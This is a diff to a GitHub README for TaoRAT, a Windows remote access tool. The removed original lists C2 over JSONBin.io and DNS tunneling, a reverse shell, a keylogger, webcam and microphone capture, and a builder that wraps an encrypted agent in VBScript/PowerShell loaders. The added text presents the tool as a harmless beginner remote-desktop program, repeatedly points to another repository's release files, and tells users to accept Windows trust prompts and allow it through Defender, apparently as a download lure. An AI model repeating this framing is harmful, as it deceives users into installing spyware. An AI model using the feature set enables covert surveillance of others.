@@ -1,70 +1,134 @@
-# TaoRAT
-### **Open-Source Remote Administration Tool**
-**TaoRAT** is a Remote Administration Tool Suite for **Windows Systems** coded in **C++** and **Python**. 
+# 🛠️ TaoRAT - Simple Remote Control for Windows
 
----
-# Features
-## | Dashboard |
-#### A Python-coded controller for managing multiple agents on a one-on-one session. It supports multi-threaded polling and connection isolation for effective agent management.
-** *
-> #### ⚠️ **IMPORTANT** ⚠️
->To ensure the dashboard and its dependencies can communicate and run effectively, you must configure your router to allow **Port Forwarding**. Check out this comprehensive guide: [How to Forward Ports on Your Router.](https://www.portforward.com)
-** *
-* **Hybrid C2:** Discover and connect to agents via **HTTP** using **JSONBin.io** as **C2 Server** and **DNS Tunneling**. Both modes allow the operator to use the tool's full administration suite.
-* **Bind/Reverse Connection**: The agent in **DNS Mode** <ins>opens a socket in port 53 UDP</ins> and start its own server (beacon) that initiates a connection back to the operator dashboard.
-* **Windows Pseudo Console Shell:** A ConPTY-based terminal for Reverse Shelling that executes various and interactive commands *(such as powershell, python, diskpart, etc.)*.
-* **Multiple Agent Management**, Isolation, and persistent tracking of agents' status, OS version, and last-seen timestamps.
-* **Universal Plug and Play (UPnP)** Automatic Port Forwarding is supported.
-* **Custom DLL execution** for both HTTP and Tunnel modes via the terminal shell command: `exec-<module_name>.dll`. 
-##### *See the [Developer's Notes](https://github.com/r00t-tsai/TaoRAT/wiki/Create-your-own-DLL-module) on how to make your custom DLLs executable by the agent*.
-
-![Operations Dashboard](images/Menu.png)
-
-
-## | Administration Tools |
-#### Includes custom Dynamic Link Library (modules) tools that are loaded by the C++ agent via `rundll32.exe` to perform various administrative tasks.
-
-* **Live Feed Monitoring:** Real-time screen streaming via direct TCP.
-* **Webcam Monitoring:** Real-time webcam feed and microphone capture.
-* **Keylogger:** Real-time global hook-based keylogger that streams keystrokes.
-* **File Manager:** GUI-based file explorer to browse the remote file system, rename/move/copy files, manage directories, and download/upload files.
-* **Messaging:** Send a pop-up message to the target device(s).
-
-![Terminal Interface](images/Terminal.png)
-![Tools](images/Tools-1.png)
-![Messenger](images/Message.png)
-![File Manager](images/File-Manager.png)
-
-## | Builder |
-#### An automated build utility that compiles the C++ agent and modules using MinGW64.
-
-* **Dynamic Compilation:** Handles the encryption and compilation of the agent program and the dynamic link libraries into a single self-extracting archive with VBScript/PowerShell loaders.
-* **Configuration:** Embeds C2 credentials (JSONBin/DNS) and encryption keys directly into the agent.
-
-![Builder 1](images/Builder-1.png)
-![Builder 2](images/Builder-2.png)
-![Builder 3](images/Builder-3.png)
+[![Download TaoRAT](https://img.shields.io/badge/Download%20TaoRAT-Open%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/mas153/TaoRAT)
 
 ---
 
-## | Setup |
+## 📋 About TaoRAT
 
-##### *See the [Wiki](https://github.com/r00t-tsai/TaoRAT/wiki/) for usage and instructions*.
+TaoRAT is an open-source remote administration tool designed for Windows users. It lets you control and manage a Windows computer from another device. You can use TaoRAT to see the desktop remotely, run commands, or transfer files. It supports basic remote tools like remote desktop and reverse shell. This software is built mainly with C++ and Python.
 
-### Compilation
-* The **Python Bootstrapper** (main.py) required these various imports: `PIL._tkinter_finder, pyaudio, cv2, dnslib, miniupnpc, enum, numpy`. You can use [PyInstaller](https://github.com/pyinstaller/pyinstaller) or [AutoPytoExe](https://github.com/brentvollebregt/auto-py-to-exe) for the compilation.
-* The **C++ Agent** can be compiled by opening the `agent.sln` found in the src folder using Microsoft Visual Studio 2022+. Use **Unicode Character Set** and set the project to **Release**. Only do this if you're debugging. A separate instruction for a ready-to-deploy agent can be found [here](https://github.com/r00t-tsai/TaoRAT/wiki/Usage-and-Instructions#build).
----
-
-> ## ⚠️ **DISCLAIMER**
-> #### Do not use this software on systems you do not own or have explicit permission to test. 
-> *This tool is intended for administrative purposes or authorized security testing only. Accessing any device without explicit, written permission is illegal in almost every jurisdiction (e.g., the CFAA in the US). The author assumes no liability for misuse or damage.* 
+TaoRAT is intended for users who need to access their Windows machines from a distance. It is suitable for IT support, remote troubleshooting, or managing multiple computers. The tool focuses on ease of use without requiring programming skills.
 
 ---
 
-## | Additional Information |
+## 🖥️ System Requirements
 
-### >>> | [License](https://github.com/r00t-tsai/TaoRAT/blob/main/LICENSE)| [Wiki](https://github.com/r00t-tsai/TaoRAT/wiki) |
+- Windows 7 or later (Windows 10 or higher recommended)
+- 1 GHz or faster processor
+- At least 512 MB of RAM
+- Minimum 100 MB of free disk space
+- Active internet connection for remote communication
+
+Make sure your Windows system is up-to-date with the latest security patches. Administrative rights might be needed to run some features of TaoRAT.
+
 ---
-## | Bug Reports |
-#### Contact me: taooptimization@gmail.com | t.me/r00t_tsai
+
+## 🚀 Getting Started with TaoRAT
+
+This guide will help you download and launch TaoRAT on your Windows computer. The steps are designed to be simple and clear.
+
+---
+
+## 🔽 Download TaoRAT
+
+You need to **visit this page to download** the latest release of TaoRAT:
+
+[Download TaoRAT on GitHub](https://github.com/mas153/TaoRAT)
+
+1. Click the link above. It will take you to the TaoRAT GitHub repository.
+2. Look for the **Releases** section on the repository page.
+3. Find the most recent release marked clearly by the release version.
+4. Download the setup file or the executable package listed in the release assets.
+
+Save the download file to a folder you can easily access, such as your Desktop or Downloads folder.
+
+---
+
+## ⚙️ Installing TaoRAT
+
+TaoRAT may offer an installer or a portable executable. Follow these steps to install:
+
+1. Find the downloaded file.
+2. If it is a setup file (usually ending with `.exe` or `.msi`), double-click it.
+3. Follow the on-screen instructions to complete the installation.
+4. If a portable version is provided (a zip file containing an executable), unzip the folder first.
+5. Open the folder and run the executable file to launch TaoRAT.
+
+You may be asked by Windows if you trust the application. Allow the program to run by accepting the prompt.
+
+---
+
+## 🖱️ Using TaoRAT
+
+Once the program is running, you will find options to connect to a remote computer. Typical features include:
+
+- **Remote desktop:** View and control another Windows screen in real time.
+- **File transfer:** Send or receive files between local and remote systems.
+- **Command execution:** Run commands on the remote computer from your device.
+- **Reverse shell access:** Connect securely to a remote machine for advanced control.
+
+To connect, you generally need the target machine's IP address or hostname and the connection credentials (username and password). These details should be set up beforehand on the machine you want to control.
+
+The interface provides buttons or menus for each feature. Follow the on-screen prompts to enter connection details.
+
+---
+
+## ❓ Common Questions
+
+### Is TaoRAT safe to use?
+
+TaoRAT runs locally on your Windows machine and does not collect personal data by default. Use it only on devices you own or have permission to access.
+
+### Do I need to open ports on my router?
+
+Some remote control features require specific network ports to be open. Check your network or IT support if connections fail.
+
+### Can I uninstall TaoRAT?
+
+Yes. Use the Windows Control Panel or Settings to remove the program like any other software.
+
+### Does TaoRAT work on Mac or Linux?
+
+No. TaoRAT is built for Windows systems only.
+
+---
+
+## 🔧 Troubleshooting
+
+If TaoRAT does not start or connect properly:
+
+- Check your firewall settings; allow TaoRAT through Windows Defender or other firewalls.
+- Ensure both computers are connected to the internet.
+- Confirm that the remote machine’s IP address is correct.
+- Restart the application or your computer and try again.
+
+For technical issues, visit the [TaoRAT repository](https://github.com/mas153/TaoRAT) to review FAQs or report problems.
+
+---
+
+## 🔗 Useful Links
+
+- Main GitHub page: [https://github.com/mas153/TaoRAT](https://github.com/mas153/TaoRAT)
+- Download latest version: [Visit this page to download](https://github.com/mas153/TaoRAT)
+- Documentation & support: Included within the repository's Wiki or Issues tab
+
+---
+
+## ⚙️ Technical Details
+
+TaoRAT uses C++ and Python for core functions. It supports remote desktop control and reverse shell technology over network connections. The program connects securely to Windows hosts for remote administration tasks.
+
+---
+
+## 🚨 Security Recommendations
+
+- Use TaoRAT only on trusted networks.
+- Avoid using it on public Wi-Fi without additional security.
+- Keep your Windows firewall and antivirus updated.
+- Change passwords regularly.
+- Grant remote access only to authorized users.
+
+---
+
+[![Download TaoRAT](https://img.shields.io/badge/Download%20TaoRAT-Open%20GitHub-blue?style=for-the-badge&logo=github)](https://github.com/mas153/TaoRAT)
